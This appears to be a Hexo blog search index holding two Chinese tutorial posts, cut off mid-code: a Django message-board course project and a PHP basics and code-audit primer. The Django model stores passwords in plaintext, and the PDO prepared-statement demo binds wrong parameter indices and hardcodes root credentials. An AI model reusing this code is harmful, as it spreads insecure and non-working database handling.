<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PythonWEB课程设计</title>
      <link href="/2022/12/25/PythonWEB%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
      <url>/2022/12/25/PythonWEB%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h1><p>​开发工具使用vscode ， 前端使用layui框架和jQuery ，后端使用django==2.1.7 ； 数据库使用mysql8.0 。前端统一使用Ajax请求，后端返回json字符串，前端存储使用sessionStorage，登录信息使用session存储。</p><h1 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h1><h2 id="1、登录注册功能"><a href="#1、登录注册功能" class="headerlink" title="1、登录注册功能"></a>1、登录注册功能</h2><p>​登陆的时候使用js对输入框信息进行校验，若不符合要求则弹框提醒。前端验证通过后，使用Ajax请求发送数据，后端验证后返回json数据，前端根据json数据，进行相应的处理。如果登录失败则提示相应信息，如果登录成功则前往留言板查看留言。</p><p>​注册信息的时候，首先使用前端技术验证用户名和密码是否符合要求，在用户名的input框失去焦点后，发送Ajax请求，前端接收到后端传送的json数据验证输入的用户名是否已经重复，如果用户名已存在，则动态的将提示信息显示在页面。如果注册信息都符合要求则注册成功后跳转到登录页面。</p><h2 id="2、留言功能"><a href="#2、留言功能" class="headerlink" title="2、留言功能"></a>2、留言功能</h2><p>​用户可以进行留言，留言信息包括留言标题和留言内容。普通用户只能查看自己的留言信息，管理员可以查看所有的留言信息，并且可以删除指定的留言信息。查看留言的信息内容包含留言用户名，留言标题，留言内容，留言时间。</p><h2 id="3、权限管理"><a href="#3、权限管理" class="headerlink" title="3、权限管理"></a>3、权限管理</h2><p>​用户角色分为普通用户和管理员，普通用户只能查看自己的留言信息，删除自己的留言信息；管理员可以查看所有留言信息，并且有权删除留言信息。</p><h1 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a>总体设计</h1><h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><h3 id="User表"><a href="#User表" class="headerlink" title="User表"></a>User表</h3><p>这个表主要存储用户信息，包换字段uid(主键)，name(姓名)，passwd(密码)，auth(权限，0表示普通用户，1表示管理员)。</p><h3 id="user-message表"><a href="#user-message表" class="headerlink" title="user_message表"></a>user_message表</h3><p>这个表主要存储留言信息。包含字段:id(主键)，name(留言者用户名)，title(留言标题)， message(留言内容)，time(留言时间)，uid(发送者id)。</p><p>其中一个用户可以发送多条留言，一条留言只对应一个用户，因此这两个表属于一对多的关系。所以，在user_message表中的uid字段设置外键，引用User表的uid字段。</p><h3 id="model层代码："><a href="#model层代码：" class="headerlink" title="model层代码："></a>model层代码：</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>db <span class="token keyword">import</span> models<span class="token keyword">class</span> <span class="token class-name">UserMessage</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    id <span class="token operator">=</span> models<span class="token punctuation">.</span>AutoField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span><span class="token string">'主键'</span><span class="token punctuation">)</span>    uid <span class="token operator">=</span> models<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">,</span>to_field<span class="token operator">=</span><span class="token string">"uid"</span><span class="token punctuation">,</span>on_delete<span class="token operator">=</span>models<span class="token punctuation">.</span>CASCADE<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#指定外键</span>    name <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> null<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span>u<span class="token string">'用户名'</span><span class="token punctuation">)</span>    title <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span>u<span class="token string">'联系地址'</span><span class="token punctuation">)</span>    message <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span>u<span class="token string">'留言信息'</span><span class="token punctuation">)</span>    time <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span>u<span class="token string">'留言时间'</span><span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">Meta</span><span class="token punctuation">:</span>        db_table <span class="token operator">=</span> <span class="token string">'user_message'</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    uid <span class="token operator">=</span> models<span class="token punctuation">.</span>AutoField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span><span class="token string">'主键'</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> null<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span>u<span class="token string">'用户名'</span><span class="token punctuation">)</span>    passwd <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span>verbose_name<span class="token operator">=</span>u<span class="token string">'密码'</span><span class="token punctuation">)</span>    auth <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> verbose_name<span class="token operator">=</span>u<span class="token string">'权限'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0代表普通用户 ，1代表管理员权限</span>    <span class="token keyword">class</span> <span class="token class-name">Meta</span><span class="token punctuation">:</span>        db_table <span class="token operator">=</span> <span class="token string">'user'</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="接口说明"><a href="#接口说明" class="headerlink" title="接口说明"></a>接口说明</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''登录成功后把user的信息存储到session中，在以下接口中要先判断session是否存在，来判断登录状态，若未登录则跳转到登录界面'''</span><span class="token triple-quoted-string string">'''接受前端获取的用户名和密码，验证是否存在，将信息返回至前端 '''</span>login<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''接受前端获取的用户名和密码，将注册信息存入数据库'''</span>register<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''接收前端用户名，根据用户名查询信息，判断此用户名是否已存在，将信息返回至前端 '''</span>checkUsername<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''根据id删除留言信息，并且将返回成功与否信息传至前端，删除成功后刷新页面'''</span>delMsgByMid<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''    获取前端留言的信息，需要在此接口中补充用户uid，发送时间，把数据封装完成后    保存到数据库，并且返回成功与否的信息'''</span>saveMsg<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''    通过session获取用户，若用户的auth值为0，则表示普通用户，在查询留言表的时候根据uid查询。    若auth的值为1，则表示管理员用户，则把留言表中的数据全部查询。    把查询结果转成json返回至前端'''</span>getMsg<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''退出登录，清除session，跳转到登录界面'''</span>exitLogin<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="作品展示"><a href="#作品展示" class="headerlink" title="作品展示"></a>作品展示</h1><h2 id="登录功能展示"><a href="#登录功能展示" class="headerlink" title="登录功能展示"></a>登录功能展示</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204443953.png" alt="image-20211210204443953"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204518293.png" alt="image-20211210204518293"></p><h2 id="注册功能展示"><a href="#注册功能展示" class="headerlink" title="注册功能展示"></a>注册功能展示</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204641774.png" alt="image-20211210204641774"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204818488.png" alt="image-20211210204818488"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204950631.png" alt="image-20211210204950631"></p><h2 id="查看留言展示"><a href="#查看留言展示" class="headerlink" title="查看留言展示"></a>查看留言展示</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210202846083.png" alt="image-20211210202846083"></p><h2 id="增加留言展示"><a href="#增加留言展示" class="headerlink" title="增加留言展示"></a>增加留言展示</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204040827.png" alt="image-20211210204040827"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204109003.png" alt="image-20211210204109003"></p><h2 id="删除留言"><a href="#删除留言" class="headerlink" title="删除留言"></a>删除留言</h2><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204208016.png" alt="image-20211210204208016"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204221925.png" alt="image-20211210204221925"></p><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210204242283.png" alt="image-20211210204242283"></p><h2 id="权限管理展示"><a href="#权限管理展示" class="headerlink" title="权限管理展示"></a>权限管理展示</h2><h3 id="普通用户"><a href="#普通用户" class="headerlink" title="普通用户"></a>普通用户</h3><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210203730276.png" alt="image-20211210203730276"></p><h3 id="管理员"><a href="#管理员" class="headerlink" title="管理员"></a>管理员</h3><p><img src="https://hexo-images1.oss-cn-beijing.aliyuncs.com/imgs/image-20211210203646655.png" alt="image-20211210203646655"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计</title>
      <link href="/2022/12/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/12/25/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、基础PHP"><a href="#一、基础PHP" class="headerlink" title="一、基础PHP"></a>一、基础PHP</h1><h2 id="Windows下查看端口"><a href="#Windows下查看端口" class="headerlink" title="Windows下查看端口"></a>Windows下查看端口</h2><pre class="line-numbers language-shell"><code class="language-shell">netstat -an <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="使用Cookie记录访问页面的次数"><a href="#使用Cookie记录访问页面的次数" class="headerlink" title="使用Cookie记录访问页面的次数"></a>使用Cookie记录访问页面的次数</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"access"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"access"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"access"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"access"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$num</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"access"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解决乱码问题"><a href="#解决乱码问题" class="headerlink" title="解决乱码问题"></a>解决乱码问题</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><pre class="line-numbers language-php"><code class="language-php">继承语法<span class="token delimiter">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">class</span> <span class="token class-name">Father</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Money</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"100000"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Son</span> <span class="token keyword">extends</span> <span class="token class-name">Father</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">useMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"-1000"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Money</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">useMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">public</span><span class="token keyword">protected</span><span class="token keyword">private</span>外部YNN子类中YYN本类中YYYself与<span class="token keyword">parent</span>this 代表 本对象self 代表 本类   <span class="token comment" spellcheck="true">//静态变量  静态方法</span><span class="token keyword">parent</span> 代表 父类<span class="token keyword">final</span><span class="token keyword">final</span> 类不能被继承<span class="token keyword">final</span> 方法不能被重写<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>抽象类 和 抽象方法抽象类的语法<span class="token punctuation">:</span>类前要加<span class="token keyword">abstract</span><span class="token punctuation">,</span>则为抽象类方法前也可以加<span class="token keyword">abstract</span> <span class="token punctuation">,</span>则为抽象方法抽象方法没有方法体抽象类中也可以有已经实现的方法<span class="token punctuation">,</span>但只有要<span class="token number">1</span>个方法为抽象<span class="token punctuation">,</span>则类仍是抽象的抽象类不能实例化接口接口本身就是抽象的<span class="token punctuation">,</span>方法前不用加<span class="token keyword">abstract</span>接口里的方法<span class="token punctuation">,</span>只能是<span class="token keyword">public</span>类可以同时实现多个接口注：抽象类， 相当于一类事物的规范； 接口： 组成事物的零件的规范<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Single</span><span class="token punctuation">{</span>            <span class="token keyword">public</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>            <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token variable">$ob</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//给新对象加一个随机数,便于判断是否为1个对象</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rand</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getIns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>Single<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$ob</span> <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                Single<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$ob</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Single</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                 <span class="token keyword">return</span> Single<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$ob</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//只会有一个对象 </span>    <span class="token variable">$a</span> <span class="token operator">=</span> Single<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getIns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$v</span> <span class="token operator">=</span> Single<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getIns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> Single<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getIns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$y</span> <span class="token operator">=</span> Single<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getIns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$y</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PDO预处理"><a href="#PDO预处理" class="headerlink" title="PDO预处理"></a>PDO预处理</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//简单测试</span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string">'mysql:dbname=test_51cto3;host=localhost;charset=utf8'</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'123456'</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Connection failed: '</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//var_dump($pdo);</span>    <span class="token variable">$k1</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//$k2 = $pdo->query("insert into user (name,age) values('alex1221',20)");</span>    <span class="token comment" spellcheck="true">//var_dump($k2);</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"select * from user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PDO预处理机制可以有效的防止SQL注入风险。</span><span class="token comment" spellcheck="true">//预编译简单演示</span><span class="token comment" spellcheck="true">//使用PDO时，建议升级到php 5.3.6+，并在DSN字符串中指定charset.</span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token string">'mysql:dbname=test_51cto3;host=localhost;charset=utf8'</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'123456'</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Connection failed: '</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'set names utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where uid>? and age>?"</span><span class="token punctuation">;</span>    <span class="token variable">$stat</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stat</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stat</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stat</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$arrResult</span> <span class="token operator">=</span> <span class="token variable">$stat</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arrResult</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$value</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$k</span><span class="token punctuation">.</span><span class="token string">"---"</span><span 